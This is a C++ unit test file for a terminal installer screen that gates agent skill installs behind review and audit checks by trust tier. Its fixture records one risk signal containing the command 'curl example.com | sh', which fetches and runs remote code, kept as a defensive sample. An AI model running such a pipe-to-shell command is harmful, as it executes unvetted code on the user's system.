#include "tui/skills_install_sheet.h"

#include "tests/test_util.h"

namespace {

tui::InstallEvidence evidence(agent::TrustTier tier = agent::TrustTier::Community) {
    tui::InstallEvidence e;
    e.name = "tdd";
    e.source = "acme/skills";
    e.tier = tier;
    e.files = 3;
    e.bytes = 2048;
    e.tokens = 512;
    e.risks.push_back({"shell", 4, "curl example.com | sh"});
    return e;
}

tui::InstallSheetOptions fresh_options() {
    tui::InstallSheetOptions options;
    options.review_required = true;
    return options;
}

} // namespace

TEST(install_sheet_community_needs_a_review_before_enter_works) {
    tui::InstallSheet sheet(evidence(), fresh_options());
    ASSERT(!sheet.can_confirm());
    ASSERT_EQ(static_cast<int>(sheet.key('\r')), static_cast<int>(tui::InstallSheetAction::None));
    ASSERT(sheet.status().find("review required") != std::string::npos);

    ASSERT_EQ(static_cast<int>(sheet.key('p')), static_cast<int>(tui::InstallSheetAction::Preview));
    ASSERT(sheet.reviewed());
    ASSERT(sheet.can_confirm());
    ASSERT_EQ(static_cast<int>(sheet.key('\r')),
              static_cast<int>(tui::InstallSheetAction::Confirm));
}

TEST(install_sheet_unread_install_satisfies_the_review_gate) {
    tui::InstallSheet sheet(evidence(), fresh_options());
    ASSERT(!sheet.can_confirm());
    sheet.key('x');
    ASSERT(sheet.unread_install());
    ASSERT(sheet.can_confirm());
    ASSERT(sheet.status().find("review required") == std::string::npos);
}

TEST(install_sheet_official_and_audited_sources_need_no_review) {
    for (agent::TrustTier tier : {agent::TrustTier::Official, agent::TrustTier::Audited}) {
        tui::InstallSheet sheet(evidence(tier), fresh_options());
        ASSERT(sheet.review_satisfied());
        ASSERT(sheet.can_confirm());
    }
}

TEST(install_sheet_review_can_be_switched_off) {
    tui::InstallSheetOptions options;
    options.review_required = false;
    tui::InstallSheet sheet(evidence(agent::TrustTier::Unverified), options);
    ASSERT(sheet.can_confirm());
    ASSERT_EQ(static_cast<int>(sheet.key('\r')),
              static_cast<int>(tui::InstallSheetAction::Confirm));
}

TEST(install_sheet_collision_defaults_to_replace_and_can_be_refused) {
    tui::InstallSheetOptions options = fresh_options();
    options.project_exists = true;
    tui::InstallSheet sheet(evidence(), options);
    sheet.key('p'); // satisfy the review gate so this test isolates collision
    ASSERT(sheet.collision());
    ASSERT(sheet.replace());
    ASSERT(sheet.can_confirm());

    sheet.key('r');
    ASSERT(!sheet.replace());
    ASSERT(!sheet.can_confirm());
    ASSERT(sheet.status().find("name collision") != std::string::npos);

    sheet.key('r');
    ASSERT(sheet.can_confirm());
    ASSERT(sheet.decision().replace);
}

TEST(install_sheet_scope_toggle_follows_the_collision_of_each_root) {
    tui::InstallSheetOptions options = fresh_options();
    options.project_exists = true;
    tui::InstallSheet sheet(evidence(), options);
    ASSERT(sheet.scope() == tui::InstallScope::Project);
    ASSERT(sheet.replace());

    ASSERT_EQ(static_cast<int>(sheet.key('\t')),
              static_cast<int>(tui::InstallSheetAction::ToggleScope));
    ASSERT(sheet.scope() == tui::InstallScope::Global);
    ASSERT(!sheet.collision());
    ASSERT(!sheet.replace());
    ASSERT(sheet.target().find("/.config/amber/skills/tdd") != std::string::npos);

    sheet.key('\t');
    ASSERT(sheet.scope() == tui::InstallScope::Project);
    ASSERT(sheet.replace());
}

TEST(install_sheet_audit_gate_requires_an_override_or_an_audit) {
    tui::InstallSheetOptions options = fresh_options();
    options.audit_required = true;
    tui::InstallSheet sheet(evidence(), options);
    sheet.key('p'); // satisfy the review gate so this test isolates the audit
    ASSERT(sheet.review_satisfied());
    ASSERT(!sheet.audit_satisfied());
    ASSERT(!sheet.can_confirm());
    ASSERT(sheet.status().find("audit required") != std::string::npos);

    sheet.key('a');
    ASSERT(sheet.audit_override());
    ASSERT(sheet.can_confirm());

    tui::InstallEvidence audited = evidence();
    audited.audited = true;
    tui::InstallSheet vetted_sheet(audited, options);
    ASSERT(vetted_sheet.audit_satisfied());
}

TEST(install_sheet_status_names_the_target_and_size) {
    tui::InstallSheet sheet(evidence(), fresh_options());
    sheet.key('p');
    ASSERT(sheet.status().find(".amber/skills/tdd") != std::string::npos);
    ASSERT(sheet.status().find("3 files") != std::string::npos);
    ASSERT(sheet.status().find("2 KB") != std::string::npos);
}

TEST(install_sheet_cancel_and_enable_toggle) {
    tui::InstallSheet sheet(evidence(), fresh_options());
    ASSERT_EQ(static_cast<int>(sheet.key('e')),
              static_cast<int>(tui::InstallSheetAction::ToggleEnabled));
    ASSERT(!sheet.enabled());
    sheet.key('p');
    tui::InstallDecision decision = sheet.decision();
    ASSERT(decision.confirmed);
    ASSERT(!decision.enabled);
    ASSERT(!decision.replace);

    ASSERT_EQ(static_cast<int>(sheet.key(27)), static_cast<int>(tui::InstallSheetAction::Cancel));
    ASSERT_EQ(static_cast<int>(sheet.key('q')), static_cast<int>(tui::InstallSheetAction::Cancel));
}

TEST(install_sheet_adequate_evidence_reports_risk_signals) {
    tui::InstallSheet sheet(evidence(), fresh_options());
    ASSERT_EQ(sheet.evidence().risks.size(), static_cast<size_t>(1));
    ASSERT_EQ(sheet.evidence().risks[0].kind, std::string("shell"));
    ASSERT_EQ(sheet.evidence().tokens, 512);
}

TEST(install_sheet_honours_the_configured_default_scope_and_open_gate) {
    tui::InstallSheetOptions options;
    options.default_global = true;
    options.review_required = false;
    tui::InstallSheet sheet(evidence(), options);
    ASSERT_TRUE(sheet.scope() == tui::InstallScope::Global);
    ASSERT_TRUE(sheet.target().find(".config/amber/skills/tdd") != std::string::npos);
    ASSERT_TRUE(sheet.can_confirm()); // review off: no body read required
}
